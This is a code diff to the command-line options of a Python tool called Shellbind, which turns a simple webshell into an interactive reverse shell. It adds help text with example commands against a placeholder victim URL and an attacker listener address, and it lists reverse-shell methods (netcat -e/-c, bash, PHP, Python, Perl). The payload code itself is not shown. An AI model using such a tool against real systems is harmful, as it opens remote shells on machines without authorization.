@@ -11,13 +11,13 @@ import os
 import multiprocessing
 
 # Parse Command Line Arguments
-parser = argparse.ArgumentParser()
+parser = argparse.ArgumentParser(description="Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.", epilog="Examples:\n-Semi interactive shell (no cd, su, etc.)\n\tshellbind.py -X POST -p cmd -u http://vuln.example/shell.php\n-Fully interactive shell with verbose output\n\tshellbind.py -p cmd -u http://vuln.example/shell.py -v -r auto:10.10.13.37:8080", formatter_class=argparse.RawTextHelpFormatter)
 
 parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True, nargs=1)
-parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used ( Default: GET)", default="GET", nargs=1)
-parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked. Example: http://www.victim.com/vuln.php", required=True, nargs=1)
-parser.add_argument("-D", "--debug", dest="debug", help="If set the programm does print debug messages", action='store_true', default=False)
-parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a full functional reverse sehll", metavar="METHOD:LHOST:PORT", nargs=1)
+parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default="GET", nargs=1)
+parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked.\nExample: http://www.victim.com/vuln.php", required=True, nargs=1)
+parser.add_argument("-v", "--verbose", dest="debug", help="Verbose Output", action='store_true', default=False)
+parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.\nAvailable methods are:\n  auto - Try until a reverse shell binds\n  php - php reverseshell\n  py - python3 reverse shell with sockets\n  py2 - python2 reverse shell with sockets\n  nc1 - netcat reverse shell with -e flag\n  nc2 - netcat reverse shell with -c flag\n  bash - sh -i reverse shell\n  perl - perl reverse shell\nLHOST should be the ip that the victim can connect to\nThe port can be any unused port", metavar="METHOD:LHOST:PORT", nargs=1)
 args = parser.parse_args()
 
 # Initilized listener and start trying reverse shell payloads
